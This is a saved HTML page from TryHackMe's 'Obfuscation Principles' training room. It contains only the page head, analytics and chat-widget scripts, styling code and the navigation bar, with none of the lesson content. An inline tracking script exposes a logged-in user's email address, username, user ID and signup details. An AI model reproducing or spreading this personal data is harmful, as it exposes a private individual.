<!DOCTYPE html>
<!-- saved from url=(0048)https://tryhackme.com/room/obfuscationprinciples -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>TryHackMe | Obfuscation Principles</title>
<meta name="description" content="Leverage tool-agnostic software obfuscation practices to hide malicious functions and create unique code.">
<meta name="og:description" content="Leverage tool-agnostic software obfuscation practices to hide malicious functions and create unique code.">
<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<meta property="og:site_name" content="TryHackMe">
<meta property="og:title" content="TryHackMe | Obfuscation Principles">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/7ec073c23670722c04caa1056194f8aa.png">
<meta property="og:url" content="https://tryhackme.com/room/obfuscationprinciples">
<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
<meta property="og:description" content="Leverage tool-agnostic software obfuscation practices to hide malicious functions and create unique code.">

<script type="text/javascript" async="" src="./TryHackMe _ Obfuscation Principles_files/pgpbhph6"></script><script src="./TryHackMe _ Obfuscation Principles_files/jquery.min.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/popper.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Obfuscation Principles_files/boostrap431.min.css">
<script src="./TryHackMe _ Obfuscation Principles_files/bootstrap431.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Obfuscation Principles_files/animate.min.css">
<link rel="stylesheet" href="./TryHackMe _ Obfuscation Principles_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
<link rel="stylesheet" media="screen" href="./TryHackMe _ Obfuscation Principles_files/general-style.css">
<script src="./TryHackMe _ Obfuscation Principles_files/script.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/validation.js"></script>

<link rel="stylesheet" type="text/css" href="./TryHackMe _ Obfuscation Principles_files/cookieconsent.min.css">
<script src="./TryHackMe _ Obfuscation Principles_files/cookieconsent.min.js"></script>
<script async="" src="./TryHackMe _ Obfuscation Principles_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
  
    gtag('config', 'G-Z8D4WL3D4P');
  </script>


<script>
    window.intercomSettings = {
      api_base: "https://api-iam.intercom.io",
      app_id: "pgpbhph6"
    };
  </script>
<script>
    (function (h, o, t, j, a, r) {
      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
      h._hjSettings = { hjid: 1950941, hjsv: 6 };
      a = o.getElementsByTagName('head')[0];
      r = o.createElement('script'); r.async = 1;
      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
      a.appendChild(r);
    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script><script async="" src="./TryHackMe _ Obfuscation Principles_files/hotjar-1950941.js"></script>
<script>
    /* Global javascript variables */

    // Used inside script.js for createRooms compelted users.
    const username = 'Silv3rsurf3r'
    const subscribed = '1'
    const level = '10'
    const intercomEnabled = 'true'
  </script>
<script>
    //add back tracking info
    const userId = "63d14e7f857ae10041bb192f"
    let tutorialComplete = false
    if ('false' == "true") {
      tutorialComplete = true
    }
    if(intercomEnabled === "true"){
      window.intercomSettings = {
        api_base: "https://api-iam.intercom.io",
        app_id: "pgpbhph6",
        user_id: userId,
        username: username,
        email: "giftonpaul@karunya.edu.in",
        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
      };
    }
    window.hj('identify', userId, {
      displayName: username,
      subscribed: "1",
      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
      experience: "advanced"
    })
  </script>
<script type="application/ld+json">

   {
      "@context":"https://schema.org",
      "@type":"Organization",
      "url":"https://tryhackme.com",
      "name":"TryHackMe",
      "logo":"https://tryhackme.com/img/favicon.png",
      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
      "email": "support@tryhackme.com",
      "sameAs":[
         "https://www.linkedin.com/company/tryhackme",
         "https://twitter.com/realtryhackme"
      ]
   }

</script>
<script>
    console.log(`%c
      ------------------
      < Happy Hacking! >
      ------------------
              \\   ^__^
               \\  (oo)\\_______
                  (__)\\       )\\/\\
                      ||----w |
                      ||     ||`, "font-family:monospace")
  </script>
<script>
  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script src="./TryHackMe _ Obfuscation Principles_files/socket.io.js"></script><script>
  let socket = io.connect({
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  })
</script><style type="text/css">.apexcharts-canvas {
  position: relative;
  user-select: none;
  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
}


/* scrollbar is not visible by default for legend, hence forcing the visibility */
.apexcharts-canvas ::-webkit-scrollbar {
  -webkit-appearance: none;
  width: 6px;
}

.apexcharts-canvas ::-webkit-scrollbar-thumb {
  border-radius: 4px;
  background-color: rgba(0, 0, 0, .5);
  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


.apexcharts-inner {
  position: relative;
}

.apexcharts-text tspan {
  font-family: inherit;
}

.legend-mouseover-inactive {
  transition: 0.15s ease all;
  opacity: 0.20;
}

.apexcharts-series-collapsed {
  opacity: 0;
}

.apexcharts-tooltip {
  border-radius: 5px;
  box-shadow: 2px 2px 6px -4px #999;
  cursor: default;
  font-size: 14px;
  left: 62px;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  top: 20px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  white-space: nowrap;
  z-index: 12;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-theme-light {
  border: 1px solid #e3e3e3;
  background: rgba(255, 255, 255, 0.96);
}

.apexcharts-tooltip.apexcharts-theme-dark {
  color: #fff;
  background: rgba(30, 30, 30, 0.8);
}

.apexcharts-tooltip * {
  font-family: inherit;
}


.apexcharts-tooltip-title {
  padding: 6px;
  font-size: 15px;
  margin-bottom: 4px;
}

.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
  background: #ECEFF1;
  border-bottom: 1px solid #ddd;
}

.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
  background: rgba(0, 0, 0, 0.7);
  border-bottom: 1px solid #333;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  display: inline-block;
  font-weight: 600;
  margin-left: 5px;
}

.apexcharts-tooltip-text-y-label:empty,
.apexcharts-tooltip-text-y-value:empty,
.apexcharts-tooltip-text-goals-label:empty,
.apexcharts-tooltip-text-goals-value:empty,
.apexcharts-tooltip-text-z-value:empty {
  display: none;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  font-weight: 600;
}

.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-goals-group, 
.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  display: flex;
}
.apexcharts-tooltip-text-goals-label:not(:empty),
.apexcharts-tooltip-text-goals-value:not(:empty) {
  margin-top: -6px;
}

.apexcharts-tooltip-marker {
  width: 12px;
  height: 12px;
  position: relative;
  top: 0px;
  margin-right: 10px;
  border-radius: 50%;
}

.apexcharts-tooltip-series-group {
  padding: 0 10px;
  display: none;
  text-align: left;
  justify-content: left;
  align-items: center;
}

.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
  opacity: 1;
}

.apexcharts-tooltip-series-group.apexcharts-active,
.apexcharts-tooltip-series-group:last-child {
  padding-bottom: 4px;
}

.apexcharts-tooltip-series-group-hidden {
  opacity: 0;
  height: 0;
  line-height: 0;
  padding: 0 !important;
}

.apexcharts-tooltip-y-group {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
  padding: 4px 8px;
}

.apexcharts-tooltip-boxPlot {
  display: flex;
  flex-direction: column-reverse;
}

.apexcharts-tooltip-box>div {
  margin: 4px 0;
}

.apexcharts-tooltip-box span.value {
  font-weight: bold;
}

.apexcharts-tooltip-rangebar {
  padding: 5px 8px;
}

.apexcharts-tooltip-rangebar .category {
  font-weight: 600;
  color: #777;
}

.apexcharts-tooltip-rangebar .series-name {
  font-weight: bold;
  display: block;
  margin-bottom: 5px;
}

.apexcharts-xaxistooltip {
  opacity: 0;
  padding: 9px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
  transition: 0.15s ease all;
}

.apexcharts-xaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-xaxistooltip:after,
.apexcharts-xaxistooltip:before {
  left: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-xaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-left: -6px;
}

.apexcharts-xaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-left: -7px;
}

.apexcharts-xaxistooltip-bottom:after,
.apexcharts-xaxistooltip-bottom:before {
  bottom: 100%;
}

.apexcharts-xaxistooltip-top:after,
.apexcharts-xaxistooltip-top:before {
  top: 100%;
}

.apexcharts-xaxistooltip-bottom:after {
  border-bottom-color: #ECEFF1;
}

.apexcharts-xaxistooltip-bottom:before {
  border-bottom-color: #90A4AE;
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top:after {
  border-top-color: #ECEFF1
}

.apexcharts-xaxistooltip-top:before {
  border-top-color: #90A4AE;
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-yaxistooltip {
  opacity: 0;
  padding: 4px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
}

.apexcharts-yaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-yaxistooltip:after,
.apexcharts-yaxistooltip:before {
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-yaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-top: -6px;
}

.apexcharts-yaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-top: -7px;
}

.apexcharts-yaxistooltip-left:after,
.apexcharts-yaxistooltip-left:before {
  left: 100%;
}

.apexcharts-yaxistooltip-right:after,
.apexcharts-yaxistooltip-right:before {
  right: 100%;
}

.apexcharts-yaxistooltip-left:after {
  border-left-color: #ECEFF1;
}

.apexcharts-yaxistooltip-left:before {
  border-left-color: #90A4AE;
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right:after {
  border-right-color: #ECEFF1;
}

.apexcharts-yaxistooltip-right:before {
  border-right-color: #90A4AE;
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip.apexcharts-active {
  opacity: 1;
}

.apexcharts-yaxistooltip-hidden {
  display: none;
}

.apexcharts-xcrosshairs,
.apexcharts-ycrosshairs {
  pointer-events: none;
  opacity: 0;
  transition: 0.15s ease all;
}

.apexcharts-xcrosshairs.apexcharts-active,
.apexcharts-ycrosshairs.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-ycrosshairs-hidden {
  opacity: 0;
}

.apexcharts-selection-rect {
  cursor: move;
}

.svg_select_boundingRect, .svg_select_points_rot {
  pointer-events: none;
  opacity: 0;
  visibility: hidden;
}
.apexcharts-selection-rect + g .svg_select_boundingRect,
.apexcharts-selection-rect + g .svg_select_points_rot {
  opacity: 0;
  visibility: hidden;
}

.apexcharts-selection-rect + g .svg_select_points_l,
.apexcharts-selection-rect + g .svg_select_points_r {
  cursor: ew-resize;
  opacity: 1;
  visibility: visible;
}

.svg_select_points {
  fill: #efefef;
  stroke: #333;
  rx: 2;
}

.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
  cursor: crosshair
}

.apexcharts-svg.apexcharts-zoomable.hovering-pan {
  cursor: move
}

.apexcharts-zoom-icon,
.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon,
.apexcharts-reset-icon,
.apexcharts-pan-icon,
.apexcharts-selection-icon,
.apexcharts-menu-icon,
.apexcharts-toolbar-custom-icon {
  cursor: pointer;
  width: 20px;
  height: 20px;
  line-height: 24px;
  color: #6E8192;
  text-align: center;
}

.apexcharts-zoom-icon svg,
.apexcharts-zoomin-icon svg,
.apexcharts-zoomout-icon svg,
.apexcharts-reset-icon svg,
.apexcharts-menu-icon svg {
  fill: #6E8192;
}

.apexcharts-selection-icon svg {
  fill: #444;
  transform: scale(0.76)
}

.apexcharts-theme-dark .apexcharts-zoom-icon svg,
.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
.apexcharts-theme-dark .apexcharts-reset-icon svg,
.apexcharts-theme-dark .apexcharts-pan-icon svg,
.apexcharts-theme-dark .apexcharts-selection-icon svg,
.apexcharts-theme-dark .apexcharts-menu-icon svg,
.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
  fill: #f3f4f5;
}

.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
  fill: #008FFB;
}

.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
  fill: #333;
}

.apexcharts-selection-icon,
.apexcharts-menu-icon {
  position: relative;
}

.apexcharts-reset-icon {
  margin-left: 5px;
}

.apexcharts-zoom-icon,
.apexcharts-reset-icon,
.apexcharts-menu-icon {
  transform: scale(0.85);
}

.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon {
  transform: scale(0.7)
}

.apexcharts-zoomout-icon {
  margin-right: 3px;
}

.apexcharts-pan-icon {
  transform: scale(0.62);
  position: relative;
  left: 1px;
  top: 0px;
}

.apexcharts-pan-icon svg {
  fill: #fff;
  stroke: #6E8192;
  stroke-width: 2;
}

.apexcharts-pan-icon.apexcharts-selected svg {
  stroke: #008FFB;
}

.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
  stroke: #333;
}

.apexcharts-toolbar {
  position: absolute;
  z-index: 11;
  max-width: 176px;
  text-align: right;
  border-radius: 3px;
  padding: 0px 6px 2px 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.apexcharts-menu {
  background: #fff;
  position: absolute;
  top: 100%;
  border: 1px solid #ddd;
  border-radius: 3px;
  padding: 3px;
  right: 10px;
  opacity: 0;
  min-width: 110px;
  transition: 0.15s ease all;
  pointer-events: none;
}

.apexcharts-menu.apexcharts-menu-open {
  opacity: 1;
  pointer-events: all;
  transition: 0.15s ease all;
}

.apexcharts-menu-item {
  padding: 6px 7px;
  font-size: 12px;
  cursor: pointer;
}

.apexcharts-theme-light .apexcharts-menu-item:hover {
  background: #eee;
}

.apexcharts-theme-dark .apexcharts-menu {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
}

@media screen and (min-width: 768px) {
  .apexcharts-canvas:hover .apexcharts-toolbar {
    opacity: 1;
  }
}

.apexcharts-datalabel.apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-pie-label,
.apexcharts-datalabels,
.apexcharts-datalabel,
.apexcharts-datalabel-label,
.apexcharts-datalabel-value {
  cursor: default;
  pointer-events: none;
}

.apexcharts-pie-label-delay {
  opacity: 0;
  animation-name: opaque;
  animation-duration: 0.3s;
  animation-fill-mode: forwards;
  animation-timing-function: ease;
}

.apexcharts-canvas .apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-hide .apexcharts-series-points {
  opacity: 0;
}

.apexcharts-gridline,
.apexcharts-annotation-rect,
.apexcharts-tooltip .apexcharts-marker,
.apexcharts-area-series .apexcharts-area,
.apexcharts-line,
.apexcharts-zoom-rect,
.apexcharts-toolbar svg,
.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-radar-series path,
.apexcharts-radar-series polygon {
  pointer-events: none;
}


/* markers */

.apexcharts-marker {
  transition: 0.15s ease all;
}

@keyframes opaque {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}


/* Resize generated styles */

@keyframes resizeanim {
  from {
    opacity: 0;
  }
  to {
    opacity: 0;
  }
}

.resize-triggers {
  animation: 1ms resizeanim;
  visibility: hidden;
  opacity: 0;
}

.resize-triggers,
.resize-triggers>div,
.contract-trigger:before {
  content: " ";
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
}

.resize-triggers>div {
  background: #eee;
  overflow: auto;
}

.contract-trigger:before {
  width: 200%;
  height: 200%;
}</style><style data-jss="" data-meta="MuiDialog">
@media print {
  .MuiDialog-root {
    position: absolute !important;
  }
}
.MuiDialog-scrollPaper {
  display: flex;
  align-items: center;
  justify-content: center;
}
.MuiDialog-scrollBody {
  overflow-x: hidden;
  overflow-y: auto;
  text-align: center;
}
.MuiDialog-scrollBody:after {
  width: 0;
  height: 100%;
  content: "";
  display: inline-block;
  vertical-align: middle;
}
.MuiDialog-container {
  height: 100%;
  outline: 0;
}
@media print {
  .MuiDialog-container {
    height: auto;
  }
}
.MuiDialog-paper {
  margin: 32px;
  position: relative;
  overflow-y: auto;
}
@media print {
  .MuiDialog-paper {
    box-shadow: none;
    overflow-y: visible;
  }
}
.MuiDialog-paperScrollPaper {
  display: flex;
  max-height: calc(100% - 64px);
  flex-direction: column;
}
.MuiDialog-paperScrollBody {
  display: inline-block;
  text-align: left;
  vertical-align: middle;
}
.MuiDialog-paperWidthFalse {
  max-width: calc(100% - 64px);
}
.MuiDialog-paperWidthXs {
  max-width: 444px;
}
@media (max-width:507.95px) {
  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthSm {
  max-width: 600px;
}
@media (max-width:663.95px) {
  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthMd {
  max-width: 960px;
}
@media (max-width:1023.95px) {
  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthLg {
  max-width: 1280px;
}
@media (max-width:1343.95px) {
  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthXl {
  max-width: 1920px;
}
@media (max-width:1983.95px) {
  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperFullWidth {
  width: calc(100% - 64px);
}
.MuiDialog-paperFullScreen {
  width: 100%;
  height: 100%;
  margin: 0;
  max-width: 100%;
  max-height: none;
  border-radius: 0;
}
.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
  margin: 0;
  max-width: 100%;
}
</style><script async="" src="./TryHackMe _ Obfuscation Principles_files/modules.5957fbf26d1b525b5a12.js" charset="utf-8"></script><style></style></head>


<body><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible" style="display: none;"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://tryhackme.com/legal/terms-of-use" target="_blank">Read more</a></span><div class="cc-compliance"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss">Got it!</a></div><!--googleon: all--></div>
<link href="./TryHackMe _ Obfuscation Principles_files/scoreboard.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Obfuscation Principles_files/introjs.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Obfuscation Principles_files/slideout.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Obfuscation Principles_files/public-rooms.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Obfuscation Principles_files/asciinema-player.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Obfuscation Principles_files/prism.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Obfuscation Principles_files/magnific-popup.css" rel="stylesheet" type="text/css"> 
<script src="./TryHackMe _ Obfuscation Principles_files/lottie-player.js"></script>

<div id="room-content">
<div id="room-content-main">
<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main">
<div class="container">
<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation">
<span class="thm-nav__hamburger-lines"></span>
</button>
<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
<div class="navbar-brand" href="/">
<a href="https://tryhackme.com/dashboard">
<img width="115px" src="./TryHackMe _ Obfuscation Principles_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
</div>
<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="navbar-item-icon far fa-browser"></i>
<div class="navbar-item-text">Dashboard</div>
</a>
</li>
<li class="nav-item active" id="nav-learn">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="navbar-item-icon far fa-book-open"></i>
<div class="navbar-item-text">Learn</div>
</a>
</li>
<li class="nav-item  dropdown lite-removable">
<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/obfuscationprinciples#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-trophy"></i>
<div class="navbar-item-text">Compete</div>
</a>
<div class="dropdown-menu" aria-labelledby="navbarDropdown">
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/leaderboards">
<div class="dropdown-menu-icon">
<i class="fas fa-trophy"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/games/koth">
<div class="dropdown-menu-icon">
<i class="fas fa-crown"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/workspace">
<div class="dropdown-menu-icon">
<i class="fas fa-user-friends"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item dropdown">
<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/obfuscationprinciples#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-ellipsis-h-alt"></i>
<div class="navbar-item-text">Other</div>
</a>
<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown" aria-labelledby="navbarDropdown">
<span class="dropdown-menu-arrow"></span>
<a class="dropdown-item" href="https://tryhackme.com/resources">Resources</a>
<a class="dropdown-item" href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a class="dropdown-item" href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/business">For Business</a>
<a class="dropdown-item" href="https://tryhackme.com/classrooms">For Education</a>
<a class="dropdown-item" target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
<a class="dropdown-item" href="https://tryhackme.com/glossary">Glossary</a>
</div>
</li>
</ul>
<ul class="navbar-nav navbar-right options vertical-align-custom">
<li class="nav-item" data-toggle="modal" data-target="#navConnModal">
<div id="thm-connection-status" class="thm-disconnected" style="display: flex;">
<div id="thm-connection-status-dot" class="dot-small"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white">Access Machines</span>
</div>
</li>
<li class="nav-item">
<div class="nav-item-streak">
<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
<script>
                            let usersStreak = { // Global variable, used in rooms logic
                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
                                streakLastAnswered: new Date('Sun Jul 16 2023 18:47:44 GMT+0100 (British Summer Time)'),
                                usersTimezone: 'Asia/Kolkata',
                                streakFreeze: 1
                            };
                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
                        </script>
</div>
</li>
<li class="nav-item dropdown" id="notification-navitem">
<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/obfuscationprinciples#" id="notification-btn" role="button" data-toggle="dropdown">
<i id="notification-icon" class="fal fa-bell"></i>
<div id="notification-dot"></div>
</a>
<div id="nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="notification-header">Notifications</div>
<div id="nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item dropdown">
<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/obfuscationprinciples#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
<img src="./TryHackMe _ Obfuscation Principles_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarAvatarDropdown">
<a class="dropdown-item" href="https://tryhackme.com/profile">Profile</a>
